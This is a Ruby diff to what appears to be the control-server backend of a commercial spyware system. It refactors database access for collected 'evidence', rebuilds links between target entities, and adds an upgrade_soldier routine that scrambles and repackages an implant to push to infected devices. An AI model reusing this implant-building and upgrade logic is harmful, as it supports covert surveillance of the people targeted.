@@ -158,17 +158,14 @@ class Item
             self.stat.last_sync = a.stat.last_sync
           end
         end
-        db = RCS::DB::DB.instance.mongo_connection
+        db = RCS::DB::DB.instance
         # evidence size
-        collection = db.collection('evidence.' + self._id.to_s)
-        self.stat.size = collection.stats['size'].to_i
+        self.stat.size = db.collection_stats("evidence.#{self._id.to_s}")['size'].to_i
         # grid size
         begin
-          collection = db.collection('grid.' + self._id.to_s + '.files')
-          self.stat.grid_size = collection.stats['size'].to_i
-          collection = db.collection('grid.' + self._id.to_s + '.chunks')
-          self.stat.grid_size += collection.stats['size'].to_i
-        rescue Mongo::OperationFailure
+          self.stat.grid_size = db.collection_stats('grid.' + self._id.to_s + '.files')['size'].to_i
+          self.stat.grid_size += db.collection_stats('grid.' + self._id.to_s + '.chunks')['size'].to_i
+        rescue Moped::Errors::OperationFailure
           # the grid collection is not present
           self.stat.grid_size = 0
         end
@@ -205,13 +202,21 @@ class Item
 
     Entity.targets.where(path: self.id).each do |entity|
       entity.remove_from_operation_groups
-      entity.update_attributes(path: new_target_path)
-      RCS::DB::LinkManager.instance.del_all_links(entity)
+      entity.path = new_target_path
       entity.save
+
       moved_entities << entity
     end
 
     moved_entities.each do |entity|
+      # Recreate links to run callbacks
+      entity.links.each { |link|
+        link_attributes = link.attributes.symbolize_keys
+        link_attributes.reject! { |key| key == :_id}
+        link_attributes.merge!(from: entity, to: link.linked_entity)
+
+        RCS::DB::LinkManager.instance.add_link(link_attributes)
+      }
       entity.handles.each { |handle| handle.link! }
       entity.add_to_operation_groups
       Aggregate.target(entity.target_id).positions.each(&:add_to_intelligence_queue)
@@ -379,6 +384,11 @@ class Item
       return upgrade_scout(method)
     end
 
+    if self.level.eql? :soldier
+      # if it's a soldier, there a special procedure
+      return upgrade_soldier
+    end
+
     # in case of elite leak
     raise "Old agent cannot be upgraded" if self.version < 2013031101
 
@@ -394,7 +404,7 @@ class Item
     # then for each platform we have differences
     case self.platform
       when 'windows'
-        add_upgrade('core64', File.join(build.tmpdir, 'core64'))
+        #add_upgrade('core64', File.join(build.tmpdir, 'core64'))
         # TODO: driver removal
         #add_upgrade('driver', File.join(build.tmpdir, 'driver'))
         #add_upgrade('driver64', File.join(build.tmpdir, 'driver64'))
@@ -447,6 +457,34 @@ class Item
         soldier_name = build.soldier_name(factory.confkey)[:name]
         add_upgrade('soldier-' + soldier_name, File.join(build.tmpdir, 'output'))
     end
+
+    build.clean
+
+    self.upgradable = true
+    self.save
+  end
+
+  def upgrade_soldier
+    factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
+    build = RCS::DB::Build.factory(self.platform.to_sym)
+    build.load({'_id' => factory._id})
+    build.unpack
+
+    # check the version of the current soldier
+    soldier_version = File.read(File.join(build.tmpdir, 'soldier_version')).to_i
+    raise "Soldier already up to date" unless self.version < soldier_version
+
+    build.patch({'demo' => self.demo})
+    build.scramble
+
+    # create the soldier
+    build.melt({'soldier' => true, 'scout' => false})
+
+    # create the installer to be sent to the current soldier
+    build.soldier_upgrade!
+
+    soldier_name = build.soldier_name(factory.confkey)[:name]
+    add_upgrade('soldier-' + soldier_name, File.join(build.tmpdir, 'output'))
 
     build.clean
 
